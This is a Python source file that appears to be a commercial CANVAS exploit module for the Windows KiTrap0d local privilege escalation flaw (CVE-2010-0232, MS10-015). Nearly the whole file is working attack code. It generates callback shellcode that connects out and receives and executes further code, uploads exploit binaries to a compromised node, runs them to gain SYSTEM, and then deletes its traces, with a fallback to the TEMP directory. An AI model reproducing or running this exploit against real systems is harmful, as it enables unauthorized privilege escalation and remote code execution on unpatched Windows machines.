#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2009
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

import socket
import time
import struct
import base64
import timeoutsocket

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

from shelllistener import *
from MOSDEF import mosdef
import canvasengine

NAME='NtVdmControl()->KiTrap0d local'
DESCRIPTION='A VDM process can trick a cs:eip check to allow access to a trusted function thru a #GP trap handler'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION['Repeatability']='One Shot'
DOCUMENTATION['CVE Name']='CVE-2010-0232'
DOCUMENTATION['MSRC']='MS10-015'
DOCUMENTATION['Date public']='01/19/2010'
DOCUMENTATION['Notes']='''
This exploit gets you LOCAL/SYSTEM on vulnerable versions of Windows (which is essentially all of them). 
It needs a writable directory to upload its payload (%TEMP% works usually) and
it will automatically chdir into %TEMP% if it can't upload a file to the current
working directory.

This exploit will set up a listener on the remote Node's 127.0.0.1.

'''

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003','Vista']
PROPERTY['MSADV']=''
PROPERTY['MS PATCHES']=["KB977165"]

NOTES="""
ms_ntvdm.exe and ms_ntvdm.dll must go in CANVAS/ms_ntvdm/Resources.

On Windows 7 we cannot terminate our ntvdm.exe process from kernel land, so we just lower the priority to IDLE in order to avoid irresponsiveness.

Usage:
Win32/MOSDEF$ runmodule ms_ntvdm -l 10.10.10.240 -d 5556
"""

TODO="""
"""

from encoder import chunkedaddencoder
from shellcode import shellcodeGenerator
import random 
import canvaserror

targets={
    0: ['Autoversioning',0],
}

class theexploit(LocalExploit):

    def __init__(self):
        LocalExploit.__init__(self)
        self.name=NAME
        self.upload_filename_exe='Resources/ms_ntvdm/ms_ntvdm.exe'
        self.upload_filename_dll='Resources/ms_ntvdm/ms_ntvdm.dll'
        self.result=0
        self.badstring='\0\xff'
        self.shellcode=""
        return

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):
        """
        Creates a callback shellcode to an ip and port - this should be
        on the localhost interface of the remote node (we are a LocalExploit)
        """
        if not self.callback:
            #usually the engine takes care of this
            self.log("Need a callback for this exploit!")
            return ""
        self.log("Sending callback to %s:%d"%(self.callback.ip, self.callback.port))
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0}) #don't mess with eip
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('loadFDasreg',{'reg':'esi'})
        sc.addAttr('RecvExecDepSafe',None)
        sc.addAttr('ExitThread',None)
        self.callback.argsDict['fromcreatethread']=0
        self.shellcode=sc.get()
        return self.shellcode

    def run_attack(self,node):
        """
        Uploads and executes the files necessary for the attack. Deletes them
        afterwards.
        """
        self.node=node
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        
        # Upload and execute the exploit with the shellcode as a commandline
        # argument.
        self.remote_filename_exe=self.node.shell.getcwd()+'\\tempfile%d.exe'%random.randint(0,1000)
        self.remote_filename_dll=self.node.shell.getcwd()+'\\tempfile.dll'
        try:
            ret1=self.node.shell.upload(self.upload_filename_exe,destfilename=self.remote_filename_exe)
            ret2=self.node.shell.upload(self.upload_filename_dll,destfilename=self.remote_filename_dll)
        except canvaserror.NodeCommandError, message:
            self.log("Could not upload files!")
            return 0
        
        if ret1 and ret2:
            self.shellcode+='A'*(3-(len(self.shellcode)%3)) #align shellcode for base64
            arguments=base64.b64encode(self.shellcode)
            self.log("Executing attack.")
            #should probably change this to spawn
            try:
                ret=self.node.shell.popen2('"%s" %s'%(self.remote_filename_exe,arguments))
            except timeoutsocket.Timeout as e:
                self.log("Error executing exploit!")
                return 0

        self.log("Sleeping for five seconds")
        time.sleep(5)
        self.log('Removing uploaded files')
        self.node.shell.unlink(self.remote_filename_exe)
        self.node.shell.unlink(self.remote_filename_dll)
        
        if "SUCCESS" in ret:
            self.log('Attack seems to think it succeeded!') 
        else:
            self.log('Attack thinks it failed, local process returned %s'%ret.replace("\n","\\n"))
        return self.ISucceeded()

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        
        #some minor error checking first
        if not self.shellcode:
            self.log("Shellcode is blank - this should not happen...recreating it")
            self.createShellcode()
            if not self.shellcode:
                self.log("Shellcode still blank?")
                self.setInfo("%s - no shellcode could be created!"%NAME)
                self.setProgress(-1)
                return 0
        
        node=self.argsDict['passednodes'][0]
        if 'win32api' not in node.capabilities:
            self.log('Node %s not a Win32 node'%(node.getname()))
        else:
            ret=self.run_attack(node)
            if not ret:
                #move into temp directory
                try:
                    tempdir=node.shell.GetEnvironmentVariable("TEMP")
                except timeoutsocket.Timeout as e:
                    self.log("Possibly node is died")
                    return 0
                self.log("Chdiring into %s on node %s"%(tempdir, node.getname()))
                chdir_ret=node.shell.chdir(tempdir)
                if chdir_ret!=-1:
                    #success!
                    self.log("Running attack in the tempdir to see if that helps")
                    ret=self.run_attack(node)
                    self.log("Attack returned: %s"%ret)
                else:
                    self.log("Could not chdir into %s - bailing out"%tempdir)
                    self.setInfo("%s: Could not find writable directory (failed)"%NAME)
                    return 0
                
        #Callback will tell us if we succeeded
        success=self.ISucceeded()
        
        if success:
            self.setInfo("%s: done (Succeeded)"%NAME)
        else:
            self.setInfo("%s: done (Failed)"%NAME)
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
    t=theexploit()
    print str(t)
